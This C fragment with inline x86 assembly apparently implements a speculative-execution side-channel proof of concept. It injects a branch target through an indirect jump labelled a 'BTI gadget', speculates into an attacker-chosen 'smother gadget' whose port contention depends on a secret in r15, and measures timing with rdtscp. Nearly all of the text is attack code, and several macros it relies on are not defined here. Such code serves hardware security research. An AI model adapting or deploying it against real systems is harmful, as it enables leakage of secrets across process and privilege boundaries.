/* set the "secret" */
asm("movq %[secret], %%r15;" :: [secret] "" (secret) :);

/* set and flush the indirect jump target */
asm volatile (
  "movq $TARGET, %[p];"
  "clflush %[p];" 
  : [p] "+m" (ptr)
  :
  );

/* prepare branch predictor state */
asm("BEG:;");
JMPNEXT64

/* indirect jump : BTI gadget*/
asm("JUMP:;");
asm("jmp *%[target];"
  :
  : [target] "m" (ptr)
  );
asm(NOP4096);

/* victim's real target - do nothing */
asm("TARGET:;");
asm("jmp END;");
asm(NOP4096);

/* attacker's expected target */
asm("SPECULATE_THIS:;");

/* smother gadget */
asm("cmp $0, %%r15;"
    "je MARK;" ::: );
CRC324 CRC322
asm("movl $-1, %%r12d; divl %%r12d;" :::);
asm("MARK:;");
OR16
asm("lfence;" :::);

/* gather timing information (dead code) */
tsc = __rdtscp(&junk);
CRC321
tsc = __rdtscp(&junk) - tsc;

asm("END:;");
